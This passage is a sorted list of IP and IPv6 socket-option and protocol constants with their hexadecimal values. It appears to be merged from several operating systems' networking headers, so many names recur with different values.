IPPROTO_UDPLITE                             = 0x88
IPPROTO_UDPLITE                   = 0x88
IPPROTO_UDPLITE                = 0x88
IPPROTO_UNKNOWN                   = 0x102
IPPROTO_VINES                           = 0x53
IPPROTO_VINES                     = 0x53
IPPROTO_VINES                  = 0x53
IPPROTO_VISA                            = 0x46
IPPROTO_VISA                      = 0x46
IPPROTO_VISA                   = 0x46
IPPROTO_VMTP                            = 0x51
IPPROTO_VMTP                      = 0x51
IPPROTO_VMTP                   = 0x51
IPPROTO_VRRP                      = 0x70
IPPROTO_WBEXPAK                         = 0x4f
IPPROTO_WBEXPAK                   = 0x4f
IPPROTO_WBEXPAK                = 0x4f
IPPROTO_WBMON                           = 0x4e
IPPROTO_WBMON                     = 0x4e
IPPROTO_WBMON                  = 0x4e
IPPROTO_WSN                             = 0x4a
IPPROTO_WSN                       = 0x4a
IPPROTO_WSN                    = 0x4a
IPPROTO_XNET                            = 0xf
IPPROTO_XNET                      = 0xf
IPPROTO_XNET                   = 0xf
IPPROTO_XTP                             = 0x24
IPPROTO_XTP                       = 0x24
IPPROTO_XTP                    = 0x24
IPV6
IPV6_2292DSTOPTS                            = 0x4
IPV6_2292DSTOPTS                        = 0x17
IPV6_2292HOPLIMIT                           = 0x8
IPV6_2292HOPLIMIT                       = 0x14
IPV6_2292HOPOPTS                            = 0x3
IPV6_2292HOPOPTS                        = 0x16
IPV6_2292NEXTHOP                        = 0x15
IPV6_2292PKTINFO                            = 0x2
IPV6_2292PKTINFO                        = 0x13
IPV6_2292PKTOPTIONS                         = 0x6
IPV6_2292PKTOPTIONS                     = 0x19
IPV6_2292RTHDR                              = 0x5
IPV6_2292RTHDR                          = 0x18
IPV6_3542DSTOPTS                        = 0x32
IPV6_3542HOPLIMIT                       = 0x2f
IPV6_3542HOPOPTS                        = 0x31
IPV6_3542NEXTHOP                        = 0x30
IPV6_3542PKTINFO                        = 0x2e
IPV6_3542RTHDR                          = 0x33
IPV6_ADDRFORM                               = 0x1
IPV6_ADDRFORM                 = 0x16
IPV6_ADDR_MC_FLAGS_PREFIX               = 0x20
IPV6_ADDR_MC_FLAGS_TRANSIENT            = 0x10
IPV6_ADDR_MC_FLAGS_UNICAST_BASED        = 0x30
IPV6_ADDR_PREFERENCES                       = 0x48
IPV6_ADDR_PREFERENCES           = 32
IPV6_ADDR_PREFERENCES         = 0x4a
IPV6_ADD_MEMBERSHIP                         = 0x14
IPV6_ADD_MEMBERSHIP           = 0x9
IPV6_ADD_MEMBERSHIP           = 0xc
IPV6_AIXRAWSOCKET             = 0x39
IPV6_AUTHHDR                                = 0xa
IPV6_AUTH_LEVEL                   = 0x35
IPV6_AUTOFLOWLABEL                          = 0x46
IPV6_AUTOFLOWLABEL                      = 0x3b
IPV6_AUTOFLOWLABEL                = 0x3b
IPV6_AUTOFLOWLABEL             = 0x3b
IPV6_BINDANY                   = 0x40
IPV6_BINDMULTI                 = 0x41
IPV6_BINDV6ONLY                         = 0x1b
IPV6_BINDV6ONLY                   = 0x1b
IPV6_BINDV6ONLY                = 0x1b
IPV6_BOUND_IF                           = 0x7d
IPV6_BOUND_IF                 = 0x41
IPV6_CHECKSUM                               = 0x7
IPV6_CHECKSUM                           = 0x1a
IPV6_CHECKSUM                     = 0x1a
IPV6_CHECKSUM                   = 19
IPV6_CHECKSUM                  = 0x1a
IPV6_CHECKSUM                 = 0x18
IPV6_CHECKSUM                 = 0x27
IPV6_DEFAULT_MULTICAST_HOPS             = 0x1
IPV6_DEFAULT_MULTICAST_HOPS       = 0x1
IPV6_DEFAULT_MULTICAST_HOPS    = 0x1
IPV6_DEFAULT_MULTICAST_LOOP             = 0x1
IPV6_DEFAULT_MULTICAST_LOOP       = 0x1
IPV6_DEFAULT_MULTICAST_LOOP    = 0x1
IPV6_DEFHLIM                            = 0x40
IPV6_DEFHLIM                      = 0x40
IPV6_DEFHLIM                   = 0x40
IPV6_DONTFRAG                               = 0x3e
IPV6_DONTFRAG                           = 0x3e
IPV6_DONTFRAG                     = 0x3e
IPV6_DONTFRAG                   = 29
IPV6_DONTFRAG                  = 0x3e
IPV6_DONTFRAG                 = 0x21
IPV6_DONTFRAG                 = 0x2d
IPV6_DROP_MEMBERSHIP                        = 0x15
IPV6_DROP_MEMBERSHIP          = 0xa
IPV6_DROP_MEMBERSHIP          = 0xd
IPV6_DSTOPTS                                = 0x3b
IPV6_DSTOPTS                            = 0x32
IPV6_DSTOPTS                      = 0x32
IPV6_DSTOPTS                    = 23
IPV6_DSTOPTS                   = 0x32
IPV6_DSTOPTS                  = 0x36
IPV6_DSTOPTS                  = 0xf
IPV6_ESP_NETWORK_LEVEL            = 0x37
IPV6_ESP_TRANS_LEVEL              = 0x36
IPV6_FAITH                              = 0x1d
IPV6_FAITH                        = 0x1d
IPV6_FAITH      = 0x1d
IPV6_FLOW                                   = 0x11
IPV6_FLOWID                    = 0x43
IPV6_FLOWINFO_FLOWLABEL       = 0xffff0f00
IPV6_FLOWINFO_FLOWLABEL       = 0xffffff
IPV6_FLOWINFO_MASK                      = 0xffffff0f
IPV6_FLOWINFO_MASK                = 0xffffff0f
IPV6_FLOWINFO_MASK                = 0xfffffff
IPV6_FLOWINFO_MASK             = 0xffffff0f
IPV6_FLOWINFO_PRIFLOW         = 0xfffffff
IPV6_FLOWINFO_PRIORITY        = 0xf000000
IPV6_FLOWINFO_SRFLAG          = 0x10000000
IPV6_FLOWINFO_TCLASS          = 0xf00f
IPV6_FLOWINFO_VERSION         = 0xf0000000
IPV6_FLOWLABEL_LEN             = 0x14
IPV6_FLOWLABEL_MASK                     = 0xffff0f00
IPV6_FLOWLABEL_MASK               = 0xffff0f00
IPV6_FLOWLABEL_MASK               = 0xfffff
IPV6_FLOWLABEL_MASK            = 0xffff0f00
IPV6_FLOWTYPE                  = 0x44
IPV6_FLOW_ECN_MASK                      = 0x3000
IPV6_FRAGTTL                            = 0x3c
IPV6_FRAGTTL                      = 0x78
IPV6_FRAGTTL                   = 0x78
IPV6_FREEBIND                               = 0x4e
IPV6_FW_ADD                             = 0x1e
IPV6_FW_ADD                       = 0x1e
IPV6_FW_ADD                    = 0x1e
IPV6_FW_DEL                             = 0x1f
IPV6_FW_DEL                       = 0x1f
IPV6_FW_DEL                    = 0x1f
IPV6_FW_FLUSH                           = 0x20
IPV6_FW_FLUSH                     = 0x20
IPV6_FW_FLUSH                  = 0x20
IPV6_FW_GET                             = 0x22
IPV6_FW_GET                       = 0x22
IPV6_FW_GET                    = 0x22
IPV6_FW_ZERO                            = 0x21
IPV6_FW_ZERO                      = 0x21
IPV6_FW_ZERO                   = 0x21
IPV6_HDRINCL                                = 0x24
IPV6_HLIMDEC                            = 0x1
IPV6_HLIMDEC                      = 0x1
IPV6_HLIMDEC                   = 0x1
IPV6_HOPLIMIT                               = 0x34
IPV6_HOPLIMIT                           = 0x2f
IPV6_HOPLIMIT                     = 0x2f
IPV6_HOPLIMIT                   = 11
IPV6_HOPLIMIT                  = 0x2f
IPV6_HOPLIMIT                 = 0x28
IPV6_HOPLIMIT                 = 0xc
IPV6_HOPOPTS                                = 0x36
IPV6_HOPOPTS                            = 0x31
IPV6_HOPOPTS                      = 0x31
IPV6_HOPOPTS                    = 22
IPV6_HOPOPTS                   = 0x31
IPV6_HOPOPTS                  = 0x34
IPV6_HOPOPTS                  = 0xe
IPV6_IPCOMP_LEVEL                 = 0x3c
IPV6_IPSEC_POLICY                           = 0x22
IPV6_IPSEC_POLICY                       = 0x1c
IPV6_IPSEC_POLICY                 = 0x1c
IPV6_IPSEC_POLICY              = 0x1c
IPV6_JOIN_ANYCAST                           = 0x1b
IPV6_JOIN_GROUP                             = 0x14
IPV6_JOIN_GROUP                         = 0xc
IPV6_JOIN_GROUP                   = 0xc
IPV6_JOIN_GROUP                 = 5
IPV6_JOIN_GROUP                = 0xc
IPV6_JOIN_GROUP               = 0x9
IPV6_JOIN_GROUP               = 0xc
IPV6_JOIN_GROUP     = 0xc
IPV6_LEAVE_ANYCAST                          = 0x1c
IPV6_LEAVE_GROUP                            = 0x15
IPV6_LEAVE_GROUP                        = 0xd
IPV6_LEAVE_GROUP                  = 0xd
IPV6_LEAVE_GROUP                = 6
IPV6_LEAVE_GROUP               = 0xd
IPV6_LEAVE_GROUP              = 0xa
IPV6_LEAVE_GROUP              = 0xd
IPV6_LEAVE_GROUP    = 0xd
IPV6_MAXHLIM                            = 0xff
IPV6_MAXHLIM                      = 0xff
IPV6_MAXHLIM                   = 0xff
IPV6_MAXOPTHDR                          = 0x800
IPV6_MAXOPTHDR                 = 0x800
IPV6_MAXPACKET                          = 0xffff
IPV6_MAXPACKET                    = 0xffff
IPV6_MAXPACKET                 = 0xffff
IPV6_MAX_GROUP_SRC_FILTER               = 0x200
IPV6_MAX_GROUP_SRC_FILTER      = 0x200
IPV6_MAX_MEMBERSHIPS                    = 0xfff
IPV6_MAX_MEMBERSHIPS           = 0xfff
IPV6_MAX_SOCK_SRC_FILTER                = 0x80
IPV6_MAX_SOCK_SRC_FILTER       = 0x80
IPV6_MINHLIM                      = 0x28
IPV6_MINHOPCOUNT                            = 0x49
IPV6_MINHOPCOUNT                  = 0x41
IPV6_MIN_MEMBERSHIPS                    = 0x1f
IPV6_MIN_MEMBERSHIPS              = 0x1f
IPV6_MIN_MEMBERSHIPS           = 0x1f
IPV6_MIN_MEMBERSHIPS = 0x1f
IPV6_MIPDSTOPTS               = 0x36
IPV6_MMTU                               = 0x500
IPV6_MMTU                         = 0x500
IPV6_MMTU                      = 0x500
IPV6_MSFILTER                           = 0x4a
IPV6_MSFILTER                     = 0x4a
IPV6_MSFILTER                  = 0x4a
IPV6_MTU                                    = 0x18
IPV6_MTU_DISCOVER                           = 0x17
IPV6_MULTICAST_ALL                          = 0x1d
IPV6_MULTICAST_HOPS                         = 0x12
IPV6_MULTICAST_HOPS                     = 0xa
IPV6_MULTICAST_HOPS               = 0xa
IPV6_MULTICAST_HOPS             = 9
IPV6_MULTICAST_HOPS            = 0xa
IPV6_MULTICAST_HOPS           = 0x7
IPV6_MULTICAST_HOPS           = 0xa
IPV6_MULTICAST_HOPS = 0xa
IPV6_MULTICAST_IF                           = 0x11
IPV6_MULTICAST_IF                       = 0x9
IPV6_MULTICAST_IF                 = 0x9
IPV6_MULTICAST_IF               = 7
IPV6_MULTICAST_IF              = 0x9
IPV6_MULTICAST_IF             = 0x6
IPV6_MULTICAST_IF             = 0x9
IPV6_MULTICAST_IF   = 0x9
IPV6_MULTICAST_LOOP                         = 0x13
IPV6_MULTICAST_LOOP                     = 0xb
IPV6_MULTICAST_LOOP               = 0xb
IPV6_MULTICAST_LOOP             = 4
IPV6_MULTICAST_LOOP            = 0xb
IPV6_MULTICAST_LOOP           = 0x8
IPV6_MULTICAST_LOOP           = 0xb
IPV6_MULTICAST_LOOP = 0xb
IPV6_NEXTHOP                                = 0x9
IPV6_NEXTHOP                            = 0x30
IPV6_NEXTHOP                      = 0x30
IPV6_NEXTHOP                    = 20
IPV6_NEXTHOP                   = 0x30
IPV6_NEXTHOP                  = 0x30
IPV6_NEXTHOP                  = 0xd
IPV6_NOPROBE                  = 0x1c
IPV6_OPTIONS                      = 0x1
IPV6_ORIGDSTADDR                            = 0x4a
IPV6_ORIGDSTADDR               = 0x48
IPV6_PAD1_OPT                 = 0x0
IPV6_PATHMTU                                = 0x3d
IPV6_PATHMTU                            = 0x2c
IPV6_PATHMTU                      = 0x2c
IPV6_PATHMTU                    = 12
IPV6_PATHMTU                   = 0x2c
IPV6_PATHMTU                  = 0x25
IPV6_PATHMTU                  = 0x2e
IPV6_PIPEX                        = 0x3f
IPV6_PKTINFO                                = 0x32
IPV6_PKTINFO                            = 0x2e
IPV6_PKTINFO                      = 0x2e
IPV6_PKTINFO                    = 13
IPV6_PKTINFO                   = 0x2e
IPV6_PKTINFO                  = 0x21
IPV6_PKTINFO                  = 0xb
IPV6_PKTINFO        = 0x13
IPV6_PKTOPTIONS                   = 0x34
IPV6_PKTOPTIONS               = 0x24
IPV6_PMTUDISC_DO                            = 0x2
IPV6_PMTUDISC_DONT                          = 0x0
IPV6_PMTUDISC_INTERFACE                     = 0x4
IPV6_PMTUDISC_OMIT                          = 0x5
IPV6_PMTUDISC_PROBE                         = 0x3
IPV6_PMTUDISC_WANT                          = 0x1
IPV6_PORTRANGE                          = 0xe
IPV6_PORTRANGE                    = 0xe
IPV6_PORTRANGE                 = 0xe
IPV6_PORTRANGE_DEFAULT                  = 0x0
IPV6_PORTRANGE_DEFAULT            = 0x0
IPV6_PORTRANGE_DEFAULT         = 0x0
IPV6_PORTRANGE_HIGH                     = 0x1
IPV6_PORTRANGE_HIGH               = 0x1
IPV6_PORTRANGE_HIGH            = 0x1
IPV6_PORTRANGE_LOW                      = 0x2
IPV6_PORTRANGE_LOW                = 0x2
IPV6_PORTRANGE_LOW             = 0x2
IPV6_PREFER_SRC_CGA             = 0x10
IPV6_PREFER_SRC_CGA           = 0x20
IPV6_PREFER_SRC_CGADEFAULT    = 0x10
IPV6_PREFER_SRC_CGAMASK       = 0x30
IPV6_PREFER_SRC_COA             = 0x02
IPV6_PREFER_SRC_COA           = 0x2
IPV6_PREFER_SRC_DEFAULT       = 0x15
IPV6_PREFER_SRC_HOME            = 0x01
IPV6_PREFER_SRC_HOME          = 0x1
IPV6_PREFER_SRC_MASK          = 0x3f
IPV6_PREFER_SRC_MIPDEFAULT    = 0x1
IPV6_PREFER_SRC_MIPMASK       = 0x3
IPV6_PREFER_SRC_NONCGA          = 0x20
IPV6_PREFER_SRC_NONCGA        = 0x10
IPV6_PREFER_SRC_PUBLIC          = 0x08
IPV6_PREFER_SRC_PUBLIC        = 0x4
IPV6_PREFER_SRC_TMP             = 0x04
IPV6_PREFER_SRC_TMP           = 0x8
IPV6_PREFER_SRC_TMPDEFAULT    = 0x4
IPV6_PREFER_SRC_TMPMASK       = 0xc
IPV6_PREFER_TEMPADDR                    = 0x3f
IPV6_PREFER_TEMPADDR              = 0x3f
IPV6_PREFER_TEMPADDR           = 0x3f
IPV6_PRIORITY_10              = 0xa000000
IPV6_PRIORITY_11              = 0xb000000
IPV6_PRIORITY_12              = 0xc000000
IPV6_PRIORITY_13              = 0xd000000
IPV6_PRIORITY_14              = 0xe000000
IPV6_PRIORITY_15              = 0xf000000
IPV6_PRIORITY_8               = 0x8000000
IPV6_PRIORITY_9               = 0x9000000
IPV6_PRIORITY_BULK            = 0x4000000
IPV6_PRIORITY_CONTROL         = 0x7000000
IPV6_PRIORITY_FILLER          = 0x1000000
IPV6_PRIORITY_INTERACTIVE     = 0x6000000
IPV6_PRIORITY_RESERVED1       = 0x3000000
IPV6_PRIORITY_RESERVED2       = 0x5000000
IPV6_PRIORITY_UNATTENDED      = 0x2000000
IPV6_PRIORITY_UNCHARACTERIZED = 0x0
IPV6_RECVDSTOPTS                            = 0x3a
IPV6_RECVDSTOPTS                        = 0x28
IPV6_RECVDSTOPTS                  = 0x28
IPV6_RECVDSTOPTS                = 28
IPV6_RECVDSTOPTS               = 0x28
IPV6_RECVDSTOPTS              = 0x28
IPV6_RECVDSTOPTS              = 0x38
IPV6_RECVDSTPORT                  = 0x40
IPV6_RECVERR                                = 0x19
IPV6_RECVERR_RFC4884                        = 0x1f
IPV6_RECVFLOWID                = 0x46
IPV6_RECVFRAGSIZE                           = 0x4d
IPV6_RECVHOPLIMIT                           = 0x33
IPV6_RECVHOPLIMIT                       = 0x25
IPV6_RECVHOPLIMIT                 = 0x25
IPV6_RECVHOPLIMIT               = 14
IPV6_RECVHOPLIMIT              = 0x25
IPV6_RECVHOPLIMIT             = 0x13
IPV6_RECVHOPLIMIT             = 0x29
IPV6_RECVHOPOPTS                            = 0x35
IPV6_RECVHOPOPTS                        = 0x27
IPV6_RECVHOPOPTS                  = 0x27
IPV6_RECVHOPOPTS                = 26
IPV6_RECVHOPOPTS               = 0x27
IPV6_RECVHOPOPTS              = 0x14
IPV6_RECVHOPOPTS              = 0x35
IPV6_RECVHOPS                 = 0x22
IPV6_RECVIF                   = 0x1e
IPV6_RECVORIGDSTADDR                        = 0x4a
IPV6_RECVORIGDSTADDR           = 0x48
IPV6_RECVPATHMTU                            = 0x3c
IPV6_RECVPATHMTU                        = 0x2b
IPV6_RECVPATHMTU                  = 0x2b
IPV6_RECVPATHMTU                = 16
IPV6_RECVPATHMTU               = 0x2b
IPV6_RECVPATHMTU              = 0x24
IPV6_RECVPATHMTU              = 0x2f
IPV6_RECVPKTINFO                            = 0x31
IPV6_RECVPKTINFO                        = 0x3d
IPV6_RECVPKTINFO                  = 0x24
IPV6_RECVPKTINFO                = 15
IPV6_RECVPKTINFO               = 0x24
IPV6_RECVPKTINFO              = 0x12
IPV6_RECVPKTINFO              = 0x23
IPV6_RECVRSSBUCKETID           = 0x47
IPV6_RECVRTHDR                              = 0x38
IPV6_RECVRTHDR                          = 0x26
IPV6_RECVRTHDR                    = 0x26
IPV6_RECVRTHDR                  = 25
IPV6_RECVRTHDR                 = 0x26
IPV6_RECVRTHDR                = 0x16
IPV6_RECVRTHDR                = 0x33
IPV6_RECVRTHDRDSTOPTS         = 0x17
IPV6_RECVSRCRT                = 0x1d
IPV6_RECVTCLASS                             = 0x42
IPV6_RECVTCLASS                         = 0x23
IPV6_RECVTCLASS                   = 0x39
IPV6_RECVTCLASS                 = 31
IPV6_RECVTCLASS                = 0x39
IPV6_RECVTCLASS               = 0x19
IPV6_RECVTCLASS               = 0x2a
IPV6_ROUTER_ALERT                           = 0x16
IPV6_ROUTER_ALERT_ISOLATE                   = 0x1e
IPV6_RSSBUCKETID               = 0x45
IPV6_RSS_LISTEN_BUCKET         = 0x42
IPV6_RTABLE                       = 0x1021
IPV6_RTHDR                                  = 0x39
IPV6_RTHDR                              = 0x33
IPV6_RTHDR                        = 0x33
IPV6_RTHDR                      = 21
IPV6_RTHDR                     = 0x33
IPV6_RTHDR                    = 0x10
IPV6_RTHDR                    = 0x32
IPV6_RTHDRDSTOPTS                           = 0x37
IPV6_RTHDRDSTOPTS                       = 0x39
IPV6_RTHDRDSTOPTS                 = 0x23
IPV6_RTHDRDSTOPTS               = 24
IPV6_RTHDRDSTOPTS              = 0x23
IPV6_RTHDRDSTOPTS             = 0x11
IPV6_RTHDRDSTOPTS             = 0x37
IPV6_RTHDR_LOOSE                            = 0x0
IPV6_RTHDR_LOOSE                        = 0x0
IPV6_RTHDR_LOOSE                  = 0x0
IPV6_RTHDR_LOOSE               = 0x0
IPV6_RTHDR_STRICT                           = 0x1
IPV6_RTHDR_STRICT                       = 0x1
IPV6_RTHDR_STRICT                 = 0x1
IPV6_RTHDR_STRICT              = 0x1
IPV6_RTHDR_TYPE_0                           = 0x0
IPV6_RTHDR_TYPE_0                       = 0x0
IPV6_RTHDR_TYPE_0                 = 0x0
IPV6_RTHDR_TYPE_0               = 0
IPV6_RTHDR_TYPE_0              = 0x0
IPV6_RTHDR_TYPE_0             = 0x0
IPV6_RTHDR_TYPE_2             = 0x2
IPV6_RXDSTOPTS                              = 0x3b
IPV6_RXHOPOPTS                              = 0x36
IPV6_SEC_OPT                  = 0x22
IPV6_SENDIF                   = 0x1f
IPV6_SOCKOPT_RESERVED1                  = 0x3
IPV6_SOCKOPT_RESERVED1            = 0x3
IPV6_SOCKOPT_RESERVED1         = 0x3
IPV6_SRC_PREFERENCES          = 0x23
IPV6_SRFLAG_LOOSE             = 0x0
IPV6_SRFLAG_STRICT            = 0x10000000
IPV6_TCLASS                                 = 0x43
IPV6_TCLASS                             = 0x24
IPV6_TCLASS                       = 0x3d
IPV6_TCLASS                     = 30
IPV6_TCLASS                    = 0x3d
IPV6_TCLASS                   = 0x26
IPV6_TCLASS                   = 0x2b
IPV6_TOKEN_LENGTH             = 0x40
IPV6_TRANSPARENT                            = 0x4b
IPV6_UNICAST_HOPS                           = 0x10
IPV6_UNICAST_HOPS                       = 0x4
IPV6_UNICAST_HOPS                 = 0x4
IPV6_UNICAST_HOPS               = 3
IPV6_UNICAST_HOPS              = 0x4
IPV6_UNICAST_HOPS             = 0x4
IPV6_UNICAST_HOPS             = 0x5
IPV6_UNICAST_HOPS   = 0x4
IPV6_UNICAST_IF                             = 0x4c
IPV6_UNSPEC_SRC               = 0x42
IPV6_USER_FLOW                              = 0xe
IPV6_USE_MIN_MTU                        = 0x2a
IPV6_USE_MIN_MTU                  = 0x2a
IPV6_USE_MIN_MTU                = 18
IPV6_USE_MIN_MTU               = 0x2a
IPV6_USE_MIN_MTU              = 0x20
IPV6_USE_MIN_MTU              = 0x2c
IPV6_V6ONLY                                 = 0x1a
IPV6_V6ONLY                             = 0x1b
IPV6_V6ONLY                       = 0x1b
IPV6_V6ONLY                     = 10
IPV6_V6ONLY                    = 0x1b
IPV6_V6ONLY                   = 0x25
IPV6_V6ONLY                   = 0x27
IPV6_V6ONLY         = 0x1b
IPV6_VERSION                            = 0x60
IPV6_VERSION                      = 0x60
IPV6_VERSION                   = 0x60
IPV6_VERSION                  = 0x60000000
IPV6_VERSION_MASK                       = 0xf0
IPV6_VERSION_MASK                 = 0xf0
IPV6_VERSION_MASK              = 0xf0
IPV6_XFRM_POLICY                            = 0x23
IP_ADDRFORM                   = 0x16
IP_ADD_MEMBERSHIP                           = 0x23
IP_ADD_MEMBERSHIP                       = 0xc
IP_ADD_MEMBERSHIP                 = 0xc
IP_ADD_MEMBERSHIP               = 5
IP_ADD_MEMBERSHIP              = 0xc
IP_ADD_MEMBERSHIP             = 0x13
IP_ADD_MEMBERSHIP             = 0xc
IP_ADD_MEMBERSHIP  = 0xc
IP_ADD_SOURCE_MEMBERSHIP                    = 0x27
IP_ADD_SOURCE_MEMBERSHIP                = 0x46
IP_ADD_SOURCE_MEMBERSHIP        = 12
IP_ADD_SOURCE_MEMBERSHIP       = 0x46
IP_ADD_SOURCE_MEMBERSHIP      = 0x17
IP_ADD_SOURCE_MEMBERSHIP      = 0x3c
IP_AUTH_LEVEL                     = 0x14
IP_BINDANY                     = 0x18
IP_BINDMULTI                   = 0x19
IP_BIND_ADDRESS_NO_PORT                     = 0x18
IP_BLOCK_SOURCE                             = 0x26
IP_BLOCK_SOURCE                         = 0x48
IP_BLOCK_SOURCE                 = 10
IP_BLOCK_SOURCE                = 0x48
IP_BLOCK_SOURCE               = 0x15
IP_BLOCK_SOURCE               = 0x3a
IP_BOUND_IF                             = 0x19
IP_BOUND_IF                   = 0x41
IP_BROADCAST                  = 0x106
IP_BROADCAST_IF               = 0x10
IP_BROADCAST_TTL              = 0x43
IP_CACHE_LINE_SIZE            = 0x80
IP_CHECKSUM                                 = 0x17
IP_DEFAULT_MULTICAST_LOOP                   = 0x1
IP_DEFAULT_MULTICAST_LOOP               = 0x1
IP_DEFAULT_MULTICAST_LOOP         = 0x1
IP_DEFAULT_MULTICAST_LOOP       = 1
IP_DEFAULT_MULTICAST_LOOP      = 0x1
IP_DEFAULT_MULTICAST_LOOP     = 0x1
IP_DEFAULT_MULTICAST_TTL                    = 0x1
IP_DEFAULT_MULTICAST_TTL                = 0x1
IP_DEFAULT_MULTICAST_TTL          = 0x1
IP_DEFAULT_MULTICAST_TTL        = 1
IP_DEFAULT_MULTICAST_TTL       = 0x1
IP_DEFAULT_MULTICAST_TTL      = 0x1
IP_DF                                       = 0x4000
IP_DF                                   = 0x4000
IP_DF                             = 0x4000
IP_DF                          = 0x4000
IP_DF                         = 0x4000
IP_DHCPINIT_IF                = 0x45
IP_DHCPMODE                   = 0x11
IP_DIVERTFL                       = 0x1022
IP_DONTFRAG                             = 0x1c
IP_DONTFRAG                    = 0x43
IP_DONTFRAG                   = 0x19
IP_DONTFRAG                   = 0x1b
IP_DONTROUTE                  = 0x105
IP_DROP_MEMBERSHIP                          = 0x24
IP_DROP_MEMBERSHIP                      = 0xd
IP_DROP_MEMBERSHIP                = 0xd
IP_DROP_MEMBERSHIP              = 6
IP_DROP_MEMBERSHIP             = 0xd
IP_DROP_MEMBERSHIP            = 0x14
IP_DROP_MEMBERSHIP            = 0xd
IP_DROP_MEMBERSHIP = 0xd
IP_DROP_SOURCE_MEMBERSHIP                   = 0x28
IP_DROP_SOURCE_MEMBERSHIP               = 0x47
IP_DROP_SOURCE_MEMBERSHIP       = 13
IP_DROP_SOURCE_MEMBERSHIP      = 0x47
IP_DROP_SOURCE_MEMBERSHIP     = 0x18
IP_DROP_SOURCE_MEMBERSHIP     = 0x3d
IP_DUMMYNET3                   = 0x31
IP_DUMMYNET_CONFIGURE                   = 0x3c
IP_DUMMYNET_CONFIGURE             = 0x3c
IP_DUMMYNET_CONFIGURE          = 0x3c
IP_DUMMYNET_DEL                         = 0x3d
IP_DUMMYNET_DEL                   = 0x3d
IP_DUMMYNET_DEL                = 0x3d
IP_DUMMYNET_FLUSH                       = 0x3e
IP_DUMMYNET_FLUSH                 = 0x3e
IP_DUMMYNET_FLUSH              = 0x3e
IP_DUMMYNET_GET                         = 0x40
IP_DUMMYNET_GET                   = 0x40
IP_DUMMYNET_GET                = 0x40
IP_EF                             = 0x8000
IP_ERRORMTU                       = 0x15
IP_ESP_NETWORK_LEVEL              = 0x16
IP_ESP_TRANS_LEVEL                = 0x15
IP_FAITH                                = 0x16
IP_FAITH                          = 0x16
IP_FAITH        = 0x16
IP_FINDPMTU                   = 0x1a
IP_FLOWID                      = 0x5a
IP_FLOWTYPE                    = 0x5b
IP_FREEBIND                                 = 0xf
IP_FW3                         = 0x30
IP_FW_ADD                               = 0x28
IP_FW_ADD                         = 0x32
IP_FW_ADD                      = 0x32
IP_FW_DEL                               = 0x29
IP_FW_DEL                         = 0x33
IP_FW_DEL                      = 0x33
IP_FW_FLUSH                             = 0x2a
IP_FW_FLUSH                       = 0x34
IP_FW_FLUSH                    = 0x34
IP_FW_GET                               = 0x2c
IP_FW_GET                         = 0x36
IP_FW_GET                      = 0x36
IP_FW_NAT_CFG                  = 0x38
IP_FW_NAT_DEL                  = 0x39
IP_FW_NAT_GET_CONFIG           = 0x3a
IP_FW_NAT_GET_LOG              = 0x3b
IP_FW_RESETLOG                          = 0x2d
IP_FW_RESETLOG                    = 0x37
IP_FW_RESETLOG                 = 0x37
IP_FW_TABLE_ADD                = 0x28
IP_FW_TABLE_DEL                = 0x29
IP_FW_TABLE_FLUSH              = 0x2a
IP_FW_TABLE_GETSIZE            = 0x2b
IP_FW_TABLE_LIST               = 0x2c
IP_FW_TBL_ADD                     = 0x2a
IP_FW_TBL_CREATE                  = 0x28
IP_FW_TBL_DEL                     = 0x2b
IP_FW_TBL_DESTROY                 = 0x29
IP_FW_TBL_EXPIRE                  = 0x2f
IP_FW_TBL_FLUSH                   = 0x2c
IP_FW_TBL_GET                     = 0x2d
IP_FW_TBL_ZERO                    = 0x2e
IP_FW_X                           = 0x31
IP_FW_ZERO                              = 0x2b
IP_FW_ZERO                        = 0x35
IP_FW_ZERO                     = 0x35
IP_HDRINCL                                  = 0x3
IP_HDRINCL                              = 0x2
IP_HDRINCL                        = 0x2
IP_HDRINCL                     = 0x2
IP_HDRINCL                    = 0x2
IP_HDRINCL         = 0x2
IP_INC_MEMBERSHIPS            = 0x14
IP_INIT_MEMBERSHIP            = 0x14
IP_IPCOMP_LEVEL                   = 0x1d
IP_IPDEFTTL                       = 0x25
IP_IPSECFLOWINFO                  = 0x24
IP_IPSEC_LOCAL_AUTH               = 0x1b
IP_IPSEC_LOCAL_CRED               = 0x19
IP_IPSEC_LOCAL_ID                 = 0x17
IP_IPSEC_POLICY                             = 0x10
IP_IPSEC_POLICY                         = 0x15
IP_IPSEC_POLICY                   = 0x16
IP_IPSEC_POLICY                = 0x15
IP_IPSEC_REMOTE_AUTH              = 0x1c
IP_IPSEC_REMOTE_CRED              = 0x1a
IP_IPSEC_REMOTE_ID                = 0x18
IP_MAXPACKET                                = 0xffff
IP_MAXPACKET                            = 0xffff
IP_MAXPACKET                      = 0xffff
IP_MAXPACKET                   = 0xffff
IP_MAXPACKET                  = 0xffff
IP_MAX_GROUP_SRC_FILTER                 = 0x200
IP_MAX_GROUP_SRC_FILTER        = 0x200
IP_MAX_MEMBERSHIPS                          = 0x14
IP_MAX_MEMBERSHIPS                      = 0xfff
IP_MAX_MEMBERSHIPS                = 0x14
IP_MAX_MEMBERSHIPS                = 0xfff
IP_MAX_MEMBERSHIPS              = 20
IP_MAX_MEMBERSHIPS             = 0xfff
IP_MAX_SOCK_MUTE_FILTER                 = 0x80
IP_MAX_SOCK_MUTE_FILTER        = 0x80
IP_MAX_SOCK_SRC_FILTER                  = 0x80
IP_MAX_SOCK_SRC_FILTER         = 0x80
IP_MAX_SOURCE_FILTER              = 0x400
IP_MAX_SOURCE_FILTER           = 0x400
IP_MAX_SOURCE_FILTER = 0x400
IP_MF                                       = 0x2000
IP_MF                                   = 0x2000
IP_MF                             = 0x2000
IP_MF                          = 0x2000
IP_MF                         = 0x2000
IP_MINFRAGSIZE                    = 0x45
IP_MINTTL                                   = 0x15
IP_MINTTL                         = 0x18
IP_MINTTL                         = 0x20
IP_MINTTL                         = 0x42
IP_MINTTL                      = 0x42
IP_MIN_MEMBERSHIPS                      = 0x1f
IP_MIN_MEMBERSHIPS                = 0x1f
IP_MIN_MEMBERSHIPS                = 0xf
IP_MIN_MEMBERSHIPS             = 0x1f
IP_MIN_MEMBERSHIPS   = 0x1f
IP_MSFILTER                                 = 0x29
IP_MSFILTER                             = 0x4a
IP_MSFILTER                    = 0x4a
IP_MSS                                      = 0x240
IP_MSS                                  = 0x240
IP_MSS                            = 0x240
IP_MSS                         = 0x240
IP_MSS                        = 0x240
IP_MTU                                      = 0xe
IP_MTU_DISCOVER                             = 0xa
IP_MULTICAST_ALL                            = 0x31
IP_MULTICAST_HOPS             = 0xa
IP_MULTICAST_IF                             = 0x20
